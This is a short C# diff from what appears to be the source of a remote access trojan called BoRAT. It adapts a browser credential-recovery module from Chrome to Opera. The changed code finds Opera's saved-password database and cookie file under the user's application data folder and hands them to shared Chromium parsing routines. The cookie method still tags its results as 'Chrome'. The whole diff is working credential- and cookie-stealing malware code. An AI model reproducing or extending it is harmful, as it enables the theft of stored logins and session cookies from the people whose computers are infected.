@@ -6,15 +6,16 @@ using System.IO;
 
 namespace BoRAT.Core.Recovery.Browsers
 {
-    class Chrome
+    class Opera
     {
+
         public static List<RecoveredAccount> GetSavedPasswords()
         {
             try
             {
-                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Google\\Chrome\\User Data\\Default\\Login Data");
-                return ChromiumBase.Passwords(datapath, "Chrome");
+                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                "Opera Software\\Opera Stable\\Login Data");
+                return ChromiumBase.Passwords(datapath, "Opera");
             }
             catch (Exception)
             {
@@ -26,8 +27,8 @@ namespace BoRAT.Core.Recovery.Browsers
         {
             try
             {
-                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Google\\Chrome\\User Data\\Default\\Cookies");
+                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                "Opera Software\\Opera Stable\\Cookies");
                 return ChromiumBase.Cookies(datapath, "Chrome");
             }
             catch (Exception)
